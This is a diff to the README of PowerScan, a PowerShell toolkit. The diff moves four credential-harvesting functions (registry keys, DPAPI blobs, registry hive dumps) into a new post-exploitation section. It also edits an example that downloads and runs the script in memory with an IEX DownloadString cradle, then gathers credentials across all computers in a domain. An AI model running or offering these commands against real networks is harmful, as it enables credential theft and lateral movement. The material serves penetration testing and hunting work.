@@ -30,6 +30,18 @@ Reconnaissance functions require either low privileges (typically domain user) o
 | Get-SpoolerStatus     | Get the status of Print Spooler service              |
 
 
+### Post
+
+Post-exploitation functions require high privileges (typically administrator).
+
+| Function                  | Description                                                   |
+| ------------------------- | ------------------------------------------------------------- |
+| Get-CimCredential         | Get credentials from common registry keys and files           |
+| Get-CimDpapiCredential    | Get credentials from DPAPI blobs                              |
+| Get-RegistryHiveDump      | Get secrets from registry hives retrieved via remote registry |
+| Get-ShadowHiveDump        | Get secrets from registry hives retrieved via shadow copy     |
+
+
 ### Hunt
 
 Hunting functions require high privileges (typically administrator).
@@ -41,9 +53,7 @@ Hunting functions require high privileges (typically administrator).
 | Get-CimAsepLogon          | Get AutoStart Extension Points related to logon               |
 | Get-CimAsepStartup        | Get common AutoStart Extension Points related to logon        |
 | Get-CimAsepWmi            | Get WMI persistences                                          |
-| Get-CimCredential         | Get credentials from common registry keys and files           |
 | Get-CimDNSCache           | Get DNS cache entries                                         |
-| Get-CimDpapiCredential    | Get credentials from DPAPI blobs                              |
 | Get-CimDriver             | Get Windows drivers                                           |
 | Get-CimLocalAdmin         | Get members of local admin group                              |
 | Get-CimLocalUser          | Get local user accounts                                       |
@@ -69,9 +79,7 @@ Hunting functions require high privileges (typically administrator).
 | Get-EventTaskModification | Get scheduled task modification events from Security logs     |
 | Get-PowershellHistory     | Get Powershell history files                                  |
 | Get-PowershellProfile     | Get Powershell profile files                                  |
-| Get-RegistryHiveDump      | Get secrets from registry hives retrieved via remote registry |
 | Get-RegistryKeyTimestamp  | Get registry key timestamp                                    |
-| Get-ShadowHiveDump        | Get secrets from registry hives retrieved via shadow copy     |
 
 
 ## Examples
@@ -98,7 +106,7 @@ Gather credentials from common registry keys and files on all domain computers (
 
 ```
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/PowerScan.ps1')
-PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Hunt/Get-CimCredential.ps1')
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Post/Get-CimCredential.ps1')
 PS C:\> $cred = Get-Credential Administrator@ADATUM.CORP
 PS C:\> Invoke-PowerScan -ScriptBlock ${Function:Get-CimCredential} -ScriptParameters @{Credential=$cred; DownloadFiles=$true} -ComputerDomain ADATUM.CORP -Credential $cred
 ```
